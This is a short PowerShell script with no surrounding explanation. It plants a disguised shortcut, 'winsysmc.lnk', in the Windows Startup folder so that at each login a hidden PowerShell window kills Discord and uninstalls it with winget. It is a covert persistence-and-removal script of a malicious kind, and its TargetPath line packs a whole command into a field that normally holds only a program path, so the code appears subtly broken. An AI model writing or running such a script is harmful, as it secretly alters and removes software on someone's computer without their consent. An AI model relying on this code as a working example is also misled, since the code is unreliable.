$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winsysmc.lnk")
$Shortcut.TargetPath = "powershell -w h taskkill /f /im discord.exe;winget uninstall Discord.Discord"
$Shortcut.Save()